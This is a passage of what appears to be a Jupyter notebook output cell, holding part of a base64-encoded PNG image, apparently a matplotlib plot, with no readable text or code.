      "image/png": "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/DLnnHMOxx9//HKXaQ3LiWIVM3/+fJ599lmGDh26VKI45JBDePjhhyunBw8ezL333svixYs5/fTT6dmzJ9tuuy3XX389AEuWLOHkk0+mc+fODBw4kP79+zNixAgg+6HjBRdcQJ8+fbjnnnu48cYb6dmzJ9tttx0HHXQQn3/+OQBvv/02vXv3pmfPnpx77rm0bPn1aJOXX3555T7PO++8ao/lpJNOokePHnTu3HmpdTp27Mh5551H9+7d6dKlS+WV09ixY+natStdu3alW7duzJs3j5NPPpmRI0cCcMABB3DMMccAMHToUM4++2wAbr/9dnbYYQe6du3KCSecUJkUWrZsybnnnkuvXr0YN24cQ4YMoVOnTmy77bb8+tffHM7j/PPP58c//jG77747W265JTfe+PWgc9Ud77Rp0/jud7/LySefTPfu3XnvvaVHHX300UfZeuut6dOnDz/72c8YOHBg5X6uuOKKyvW22WYbpk2bVuOxLF68mMGDB7PNNtvQpUsXrrrqKkaMGMH48eM5/PDD6dq1K1988QX9+vWr/AHrsGHD6NKlC9tssw1nnHFG5b5atmzJWWedxXbbbUfv3r2ZOfObgxHutNNOrLvuugD07t2b6dOnf2MdW8lExEr72H777WNZ/X7Uf+r8WBncdtttccwxx0RExI477hgTJkyIiIj77rsvjjzyyIiI+PLLL6N9+/bx+eefx/XXXx8XXnhhREQsWLAgtt9++5gyZUrcc889se+++8bixYtjxowZ0bp167jnnnsiIqJDhw5x2WWXVe5zzpw5lc/POuusuOaaayIiYsCAAXHnnXdGRMR1110Xa621VkREPPbYY/GTn/wklixZEosXL44BAwbE2LFjv3Esc+fOjYiIRYsWxa677hoTJ06s3H/FPq699to49thjIyJi4MCB8cwzz0RExLx582LhwoUxbNiw+PWvfx0RET179oxevXpFRMTgwYPj0Ucfjddeey0GDhwYX331VUREnHTSSXHLLbdERAQQd911V2UsW221VSxZsiQiIj766KNvxHveeefFtttuG59//nnMnj072rdvH++//36Nxzt16tSQFOPGjftGWV988UW0b98+3nzzzViyZEkcfPDBMWDAgMr9XH755ZXrdu7cOaZOnVrjsYwfPz723HPPyvUrYt91113jhRdeqJxfMf3+++/HJptsErNmzYqFCxfGbrvtFvfff3/lORk5cmRERJx++umV752aXH755ZWvj5UPYHzU4bO25FcUaQjEf0t6KE1vJuk5SW9JukvS6mn+Gml6clresdSxrYqGDRvGoYceCsChhx7KsGHDANh333154okn+PLLL3nkkUfYZZddaNGiBaNGjeLWW2+la9eu9OrVi7lz5/LWW2/xzDPPcPDBB7PaaqvxrW99i912222p/RxyyCGVz1999VX69u1Lly5duOOOO5g0aRIA48aN4+CDDwbgRz/6UeX6o0aNYtSoUXTr1o3u3bvzxhtv8NZbb33jWO6++266d+9Ot27dmDRp0lL15wceeCAA22+/feW36Z133pnTTjuNa665ho8//pimTZvSt29fnn76aV577TU6derEhhtuyIwZMxg3bhw77bQTo0ePZsKECfTs2ZOuXbsyevRopkyZAkCTJk046KCDAFh77bVp3rw5xx13HPfddx9rrrkm1Rk0aBAtWrSgTZs27Lbbbjz//PNFj7dDhw707t37G+W88cYbbLbZZmy55ZZI4ogjah93qKZj2XzzzZkyZQo//elPefTRR1l77bWLlvPCCy/Qr18/2rZtS9OmTTn88MN56qlsQL7VV1+98sqm8NxX58knn2To0KFcdtlltcZu5a0++nr6OfA62dCGkA19eFVEDJf0F+BY4Lr096OI2ELSoWm9Q6or0Ko3d+5cnnjiCV599VUksXjxYiTxu9/9jubNm9OvXz8ee+wx7rrrLg477DAgu6L84x//yN57771UWX//+9+L7muttdaqfD548GAeeOABtttuO26++WbGjBlTdNuI4Mwzz+SEE06ocZ2pU6dyxRVX8MILL7DuuusyePBgFixYULl8jTWyobmbNGnCokXZENtDhgxhwIABPPzww/Tu3Zt//OMfbL311nz00Uc8+uij7LLLLnz44YfcfffdtGzZklatWhERHHXUUVxyySXfiKF58+Y0adIEgKZNm/L8888zevRohg8fzp/+9CeeeOKJb2yTDVW+9HRNxztt2rSlzmNtZVVo2rTpUu0ZFeel2LFMnDiRxx57jGuvvZa7776bm26qeZTYKDL0QLNmzSrjKjz3Vb388sscd9xxPPLII6y//vo1lmcrh5JeUaTB4QeQjcOLsnfY7sCItMotwP7p+aA0TVq+h2r6T7FqjRgxgiOPPJJ33nmHadOm8d5777HZZpvxzDPPANkVxt/+9jeefvrpysSw9957c91117Fw4UIA3nzzTT777DP69OnDvffey5IlS5g5c2bRD/958+bRrl07Fi5cyB133FE5v3fv3tx7770AS7WX7L333tx0003Mnz8fgPfff59Zs2YtVeann37KWmutxTrrrMPMmTN55JFHaj3+t99+my5dunDGGWfQo0ePyraLHXfckauvvppddtmFvn37csUVV9C3b18A9thjD0aMGFG5/w8//JB33vlmf2nz58/nk08+oX///lx99dW89NJL1cbw4IMPsmDBAubOncuYMWPo2bNnruOtauutt2bq1Km8/fbbAJVXhpC10bz4YjYE+YsvvsjUqVOLHsucOXNYsmQJBx10EBdeeGHltq1atWLevHnf2HevXr0YO3Ysc+bMYfHixQwbNoxdd921aLyF3n33XQ488EBuu+02ttpqq9zbWfkq9RXF1cD/AK3S9PrAxxFR8TVkOrBxer4x2aDyRMQiSZ+k9ecUFijpeOB4gE033bSkwa9shg0bxpAhQ5aad9BBB3HnnXfSt29f9tprL4488kj2228/Vl99dSC7JXLatGl0796diKBt27Y88MADHHTQQYwePZptttmGrbbail69erHOOutUu98LL7yQXr160aFDB7p06VL54XP11VdzxBFHcOWVVzJgwIDK7ffaay9ef/11dtxxRyBrIL399tvZYIMNKsvcbrvt6NatG507d2bzzTdn5513rvX4r776ap588kmaNGlCp06d2HfffQHo27cvo0aNYosttqBDhw58+OGHlYmiU6dOXHTRRey1114sWbKEZs2ace2119KhQ4elyp43bx6DBg1iwYIFRARXXXVVtTHssMMODBgwgHfffZdzzjmHjTbaiI022qja4624WqlO8+bNueGGGxgwYABt2rShT58+vPrqq0D2mlZUF/bs2bPyw7imY2nRogVHH3105VVIxRXH4MGDOfHEE2nRogXjxo2r3He7du245JJL2G233YgI+vfvz6BBg2o9/xUuuOAC5s6dy8knnwxkV0Du5XnlVrIR7iQNBPpHxMmS+gG/Bo4GxkXEFmmdTYCHI6KLpEnA3hExPS17G9ghIubWtI8ePXrEsr4Br3r8zTpv88vvNa5vR/Pnz6dly5bMnTuXHXbYgWeffZZvfetbubf//PPP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